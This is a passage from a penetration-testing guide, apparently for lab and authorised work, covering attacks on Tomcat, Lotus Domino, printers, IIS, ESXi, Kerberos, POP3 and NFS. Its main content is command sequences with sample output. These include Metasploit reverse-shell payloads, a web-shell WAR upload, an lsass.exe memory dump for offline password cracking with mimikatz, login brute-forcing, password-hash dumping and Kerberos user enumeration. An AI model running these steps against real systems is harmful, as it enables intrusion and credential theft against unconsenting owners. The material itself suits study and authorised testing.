<span class="o">----</span>                            <span class="o">---------------</span>  <span class="o">----</span>    <span class="o">-----------</span>
<span class="n">generic</span><span class="o">/</span><span class="n">custom</span>                                   <span class="n">normal</span>  <span class="n">Custom</span> <span class="n">Payload</span>
<span class="n">generic</span><span class="o">/</span><span class="n">shell_bind_tcp</span>                           <span class="n">normal</span>  <span class="n">Generic</span> <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Bind</span> <span class="n">TCP</span> <span class="n">Inline</span>
<span class="n">generic</span><span class="o">/</span><span class="n">shell_reverse_tcp</span>                        <span class="n">normal</span>  <span class="n">Generic</span> <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Reverse</span> <span class="n">TCP</span> <span class="n">Inline</span>
<span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span>                        <span class="n">normal</span>  <span class="n">Java</span> <span class="n">Meterpreter</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Bind</span> <span class="n">TCP</span> <span class="n">Stager</span>
<span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_http</span>                    <span class="n">normal</span>  <span class="n">Java</span> <span class="n">Meterpreter</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Reverse</span> <span class="n">HTTP</span> <span class="n">Stager</span>
<span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_https</span>                   <span class="n">normal</span>  <span class="n">Java</span> <span class="n">Meterpreter</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Reverse</span> <span class="n">HTTPS</span> <span class="n">Stager</span>
<span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>                     <span class="n">normal</span>  <span class="n">Java</span> <span class="n">Meterpreter</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Reverse</span> <span class="n">TCP</span> <span class="n">Stager</span>
<span class="n">java</span><span class="o">/</span><span class="n">shell</span><span class="o">/</span><span class="n">bind_tcp</span>                              <span class="n">normal</span>  <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Bind</span> <span class="n">TCP</span> <span class="n">Stager</span>
<span class="n">java</span><span class="o">/</span><span class="n">shell</span><span class="o">/</span><span class="n">reverse_tcp</span>                           <span class="n">normal</span>  <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Java</span> <span class="n">Reverse</span> <span class="n">TCP</span> <span class="n">Stager</span>
<span class="n">java</span><span class="o">/</span><span class="n">shell_reverse_tcp</span>                           <span class="n">normal</span>  <span class="n">Java</span> <span class="n">Command</span> <span class="n">Shell</span><span class="p">,</span> <span class="n">Reverse</span> <span class="n">TCP</span> <span class="n">Inline</span>
</pre></div>
</div>
</div></blockquote>
<p>set the payload option (depending upon the target&#8217;s operating system which can be selected by set TARGET &lt;ID&gt;) by using</p>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">set</span> <span class="n">payload</span> <span class="n">java</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_https</span>    <span class="o">-</span><span class="n">to</span> <span class="n">directly</span> <span class="n">get</span> <span class="n">a</span> <span class="n">meterpreter</span> <span class="n">shell</span><span class="o">.</span>
<span class="ow">or</span>
<span class="nb">set</span> <span class="n">payload</span> <span class="n">java</span><span class="o">/</span><span class="n">shell</span><span class="o">/</span><span class="n">reverse_tcp</span>            <span class="o">-</span><span class="n">to</span> <span class="n">get</span> <span class="n">the</span> <span class="n">system</span> <span class="n">level</span> <span class="n">shell</span>
</pre></div>
</div>
</div></blockquote>
<p>Once we have obtained a meterepreter shell we can use getsystem to run the shell with an administrative rights,</p>
<p>Wait, what if the exploitation doesn&#8217;t wrk ? in that case we can exploit the application by another way. :)</p>
<ul>
<li><p class="first">Web-Shell: The exploit whih we learned above, uploads or deploys the malicious payload into the application and runs it. some times this may not work as it is supposed to be in that case we can directly upload a shell using a WAR file deployment funtionality given in the /manager/html page. This WAR file contains nothing but a small code of obtaining a shell called cmd.war file. The code can be downloaded from the link <a class="reference external" href="https://github.com/jbarcia/Web-Shells/tree/master/laudanum">Laudanum Shells</a>.</p>
<p>Once you have downloaded the file upload the file to the application. also Download the procdump.exe from <a class="reference external" href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx">ProcDump</a>. Copy the procdump file inside the .WAR previously downloaded and upload the modified file to the application. The idea of uploading the procdump with the WAR file is to obtain a lsass.exe process&#8217;s dump.</p>
</li>
</ul>
<blockquote>
<div><div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Lsass.exe (Local security Authority Subsystem Service)  is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server,handles password   changes, and creates access tokens. Dumping this process will give us file Lsass.DMP file which can be used to crack the windows machines password in offline with the help of famous mimikatz</p>
</div>
<p>the lsass.exe process dump can be taken by</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">cmd</span> <span class="o">/</span><span class="n">c</span> <span class="s2">&quot;cd C:\&lt;Path to the procdump file&gt; &amp; procdump -acceptula -ma lsass.exe MYdmp.dmp&quot;</span>
</pre></div>
</div>
<p>After uploading the WAR file, The system level shell could be obtained by tampering the url <a class="reference external" href="http:/">http:/</a>/&lt;IP Address&gt;/manager/cmd.war/cmd.jsp , should directly give us the shell in the page itself</p>
</div></blockquote>
<ul class="simple">
<li><a class="reference external" href="http://vonloesch.de/filebrowser.html">Jsp File Browser</a>: Install file browser java server page. This JSP program allows remote web-based file access and manipulation. Able to upload-download, execute commands. Thanks to Tanoy for informing about this.</li>
</ul>
</div></blockquote>
</div></blockquote>
<ul>
<li><p class="first">Searching for <strong>Canon</strong></p>
<p>Found a interesting module <strong>Canon Printer Wireless Configuration Disclosure</strong> enumerates wireless credentials from Canon printers with a web interface. It has been tested on Canon models: MG3100, MG5300, MG6100, MP495, MX340, MX870, MX890, MX920. We still need to figure out what is Options.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">canon_wireless</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>[-] 10.23.xx.xx:80 File not found
[+] 10.23.xx.xx:80 Option: 
[-] 10.23.xx.xx:80 Could not determine LAN Settings.
</pre></div>
</div>
</li>
<li><p class="first"><strong>Lotus Domino httpd</strong></p>
<p>Searching for Lotus Domino we got few modules</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">lotus</span><span class="o">/</span><span class="n">lotus_domino_hashes</span>                               <span class="n">normal</span>     <span class="n">Lotus</span> <span class="n">Domino</span> <span class="n">Password</span> <span class="n">Hash</span> <span class="n">Collector</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">lotus</span><span class="o">/</span><span class="n">lotus_domino_login</span>                                <span class="n">normal</span>     <span class="n">Lotus</span> <span class="n">Domino</span> <span class="n">Brute</span> <span class="n">Force</span> <span class="n">Utility</span>
<span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">lotus</span><span class="o">/</span><span class="n">lotus_domino_version</span>                              <span class="n">normal</span>     <span class="n">Lotus</span> <span class="n">Domino</span> <span class="n">Version</span>
</pre></div>
</div>
<p>Let&#8217;s try them one by one</p>
</li>
</ul>
<blockquote>
<div><ul class="simple">
<li><strong>Lotus Domino Version</strong> which determines Lotus Domino Server Version by several checks.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">lotus</span><span class="o">/</span><span class="n">lotus_domino_version</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span> <span class="o">-</span><span class="n">S</span> <span class="s2">&quot;Lotus&quot;</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">80</span> <span class="n">Lotus</span> <span class="n">Domino</span> <span class="n">Base</span> <span class="n">Install</span> <span class="n">Version</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;9.0.0.0&quot;</span><span class="p">]</span>
</pre></div>
</div>
<p>Let&#8217;s try <strong>Lotus Domino Login</strong> which is Lotus Domino Authentication Brute Force Utility with our default passwords.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">lotus</span><span class="o">/</span><span class="n">lotus_domino_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span> <span class="o">-</span><span class="n">S</span> <span class="s2">&quot;Lotus&quot;</span> <span class="o">-</span><span class="n">R</span>
<span class="nb">set</span> <span class="n">USERNAME</span> <span class="n">admin</span>
<span class="nb">set</span> <span class="n">PAsSwoRD</span> <span class="n">example</span><span class="nd">@123</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">80</span> <span class="n">LOTUS_DOMINO</span> <span class="o">-</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">Lotus</span> <span class="n">Domino</span> <span class="o">-</span> <span class="n">Trying</span> <span class="n">username</span><span class="p">:</span><span class="s1">&#39;admin&#39;</span> <span class="k">with</span> <span class="n">password</span><span class="p">:</span><span class="s1">&#39;example@123&#39;</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="n">Lotus</span> <span class="n">Domino</span> <span class="o">-</span> <span class="n">SUCCESSFUL</span> <span class="n">login</span> <span class="k">for</span> <span class="s1">&#39;admin&#39;</span> <span class="p">:</span> <span class="s1">&#39;example@123</span>
</pre></div>
</div>
<p>Using the above credentials we can use lotus_domino_hashes (Lotus Domino Password Hash Collector) module to download user hashes.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">lotus</span><span class="o">/</span><span class="n">lotus_domino_hashes</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span> <span class="o">-</span><span class="n">S</span> <span class="s2">&quot;Lotus&quot;</span> <span class="o">-</span><span class="n">R</span>
<span class="nb">set</span> <span class="n">NOTES_USER</span> <span class="n">admin</span>
<span class="nb">set</span> <span class="n">NOTES_PASS</span> <span class="n">example</span><span class="nd">@123</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="n">Lotus</span> <span class="n">Domino</span> <span class="o">-</span> <span class="n">Trying</span> <span class="n">dump</span> <span class="n">password</span> <span class="n">hashes</span> <span class="k">with</span> <span class="n">given</span> <span class="n">credentials</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="n">Lotus</span> <span class="n">Domino</span> <span class="o">-</span> <span class="n">SUCCESSFUL</span> <span class="n">authentication</span> <span class="k">for</span> <span class="s1">&#39;admin&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="n">Lotus</span> <span class="n">Domino</span> <span class="o">-</span> <span class="n">Getting</span> <span class="n">password</span> <span class="n">hashes</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span> <span class="n">Lotus</span> <span class="n">Domino</span> <span class="o">-</span> <span class="n">Account</span> <span class="n">Found</span><span class="p">:</span> <span class="n">nadmin</span><span class="p">,</span> <span class="n">notesadmin</span><span class="nd">@example</span><span class="o">.</span><span class="n">com</span><span class="p">,</span> <span class="p">(</span><span class="n">GEo1MDjKxxxxxxxxxxx</span><span class="p">)(</span><span class="n">GEo1MDjKxxxxxxxxxxx</span><span class="p">)</span>
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
<ul class="simple">
<li>For <strong>IIS</strong></li>
</ul>
<blockquote>
<div><p>We can check if WebDAV is enabled on the websites running IIS by <strong>HTTP WebDAV Scanner</strong> which detect webservers with WebDAV enabled.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webdav_scanner</span>
</pre></div>
</div>
<p>Sample Output: Mostly old IIS like 5.1/6.0 would have WebDAV enabled. It is disabled by default in the newer versions.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.87</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="p">(</span><span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">5.1</span><span class="p">)</span> <span class="n">has</span> <span class="n">WEBDAV</span> <span class="n">ENABLED</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>For <strong>VMware ESXi</strong></li>
</ul>
<blockquote>
<div><p>Let&#8217;s find what version they are running by <strong>VMWare ESX/ESXi Fingerprint Scanner</strong> which accesses the web API interfaces for VMware ESX/ESXi servers and attempts to identify version information for that server.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">vmware</span><span class="o">/</span><span class="n">esx_fingerprint</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span> <span class="o">-</span><span class="n">S</span> <span class="n">VMware</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="o">-</span> <span class="n">Identified</span> <span class="n">VMware</span> <span class="n">ESXi</span> <span class="mf">5.5</span><span class="o">.</span><span class="mi">0</span> <span class="n">build</span><span class="o">-</span><span class="mi">1623387</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="o">-</span> <span class="n">Identified</span> <span class="n">VMware</span> <span class="n">ESXi</span> <span class="mf">5.5</span><span class="o">.</span><span class="mi">0</span> <span class="n">build</span><span class="o">-</span><span class="mi">1623387</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">2</span> <span class="n">of</span> <span class="mi">18</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">11</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="o">-</span> <span class="n">Identified</span> <span class="n">VMware</span> <span class="n">ESXi</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">0</span> <span class="n">build</span><span class="o">-</span><span class="mi">799733</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="o">-</span> <span class="n">Identified</span> <span class="n">VMware</span> <span class="n">ESXi</span> <span class="mf">5.5</span><span class="o">.</span><span class="mi">0</span> <span class="n">build</span><span class="o">-</span><span class="mi">1623387</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">4</span> <span class="n">of</span> <span class="mi">18</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">22</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="o">-</span> <span class="n">Identified</span> <span class="n">VMware</span> <span class="n">vCenter</span> <span class="n">Server</span> <span class="mf">6.0</span><span class="o">.</span><span class="mi">0</span> <span class="n">build</span><span class="o">-</span><span class="mi">3339083</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">6</span> <span class="n">of</span> <span class="mi">18</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">33</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="o">-</span> <span class="n">Identified</span> <span class="n">VMware</span> <span class="n">ESXi</span> <span class="mf">6.0</span><span class="o">.</span><span class="mi">0</span> <span class="n">build</span><span class="o">-</span><span class="mi">3073146</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="o">-</span> <span class="n">Identified</span> <span class="n">VMware</span> <span class="n">ESXi</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">0</span> <span class="n">build</span><span class="o">-</span><span class="mi">799733</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span> <span class="mi">17</span> <span class="n">of</span> <span class="mi">18</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">94</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span> <span class="o">-</span> <span class="n">Identified</span> <span class="n">VMware</span> <span class="n">ESXi</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">0</span> <span class="n">build</span><span class="o">-</span><span class="mi">1065491</span>
</pre></div>
</div>
</div></blockquote>
</div>
</div>
<div class="section" id="kerberos-port-88">
<h2>Kerberos - Port 88<a class="headerlink" href="#kerberos-port-88" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id13">
<h3>Nmap<a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h3>
<div class="section" id="krb5-enum-users">
<h4>krb5-enum-users<a class="headerlink" href="#krb5-enum-users" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/krb5-enum-users.html">krb5-enum-users.nse</a> : Discovers valid usernames by brute force querying likely usernames against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform pre authentication.</p>
<p>The script should work against Active Directory. It needs a valid Kerberos REALM in order to operate.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">88</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">krb5</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">users</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s2">&quot;krb5-enum-users.realm=&#39;XX-XXXT&#39;&quot;</span> <span class="mf">10.74</span><span class="o">.</span><span class="mf">251.24</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">23</span> <span class="mi">12</span><span class="p">:</span><span class="mi">13</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">ecindxxxxx</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">vxxxxx</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="mf">10.74</span><span class="o">.</span><span class="mf">251.24</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.0015</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">88</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>
<span class="o">|</span> <span class="n">krb5</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">users</span><span class="p">:</span>
<span class="o">|</span> <span class="n">Discovered</span> <span class="n">Kerberos</span> <span class="n">principals</span>
<span class="o">|</span><span class="n">_</span>    <span class="n">root</span><span class="nd">@XX</span><span class="o">-</span><span class="n">XXXT</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">0.44</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="pop3-port-110">
<h2>POP3 - Port 110<a class="headerlink" href="#pop3-port-110" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id14">
<h3>Metasploit<a class="headerlink" href="#id14" title="Permalink to this headline">¶</a></h3>
<p>Two auxiliary scanner modules</p>
<div class="section" id="pop3-banner-grabber">
<h4>POP3 Banner Grabber<a class="headerlink" href="#pop3-banner-grabber" title="Permalink to this headline">¶</a></h4>
<p>Banner grabber for pop3</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">pop3</span><span class="o">/</span><span class="n">pop3_version</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">110</span> <span class="o">-</span><span class="n">R</span> <span class="o">-</span><span class="n">u</span>
</pre></div>
</div>
</div>
<div class="section" id="pop3-login-utility">
<h4>POP3 Login Utility<a class="headerlink" href="#pop3-login-utility" title="Permalink to this headline">¶</a></h4>
<p>Attempts to authenticate to an POP3 service.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">pop3</span><span class="o">/</span><span class="n">pop3_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">110</span> <span class="o">-</span><span class="n">R</span> <span class="o">-</span><span class="n">u</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id15">
<h3>Nmap<a class="headerlink" href="#id15" title="Permalink to this headline">¶</a></h3>
<p>Two NSEs</p>
<div class="section" id="pop3-capabilities">
<h4>POP3-capabilities<a class="headerlink" href="#pop3-capabilities" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/pop3-capabilities.html">pop3-capabilities.nse</a> : Retrieves POP3 email server capabilities.</p>
</div>
<div class="section" id="pop3-brute">
<h4>POP3-brute<a class="headerlink" href="#pop3-brute" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/pop3-brute.html">pop3-brute.nse</a> : Tries to log into a POP3 account by guessing usernames and passwords.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">pop3</span><span class="o">-</span><span class="n">brute</span> <span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span>
</pre></div>
</div>
<p>While playing one of Vulnhub machines, we figured out that bruteforcing POP3 service is faster than bruteforcing SSH services.</p>
</div>
</div>
</div>
<div class="section" id="rpcinfo-port-111">
<h2>RPCInfo - Port 111<a class="headerlink" href="#rpcinfo-port-111" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id16">
<h3>Metasploit<a class="headerlink" href="#id16" title="Permalink to this headline">¶</a></h3>
<div class="section" id="nfs-mount-scanner">
<h4>NFS Mount Scanner<a class="headerlink" href="#nfs-mount-scanner" title="Permalink to this headline">¶</a></h4>
<p>Check for the nfs mounts using port 111</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">nfs</span><span class="o">/</span><span class="n">nfsmount</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">111</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">24</span> <span class="n">of</span> <span class="mi">240</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">10</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">NFS</span> <span class="n">Export</span><span class="p">:</span> <span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">iso</span> <span class="p">[</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">]</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">48</span> <span class="n">of</span> <span class="mi">240</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">20</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">NFS</span> <span class="n">Export</span><span class="p">:</span> <span class="o">/</span><span class="n">DataVolume</span><span class="o">/</span><span class="n">Public</span> <span class="p">[</span><span class="o">*</span><span class="p">]</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">NFS</span> <span class="n">Export</span><span class="p">:</span> <span class="o">/</span><span class="n">DataVolume</span><span class="o">/</span><span class="n">Download</span> <span class="p">[</span><span class="o">*</span><span class="p">]</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">NFS</span> <span class="n">Export</span><span class="p">:</span> <span class="o">/</span><span class="n">DataVolume</span><span class="o">/</span><span class="n">Softshare</span> <span class="p">[</span><span class="o">*</span><span class="p">]</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">72</span> <span class="n">of</span> <span class="mi">240</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">30</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
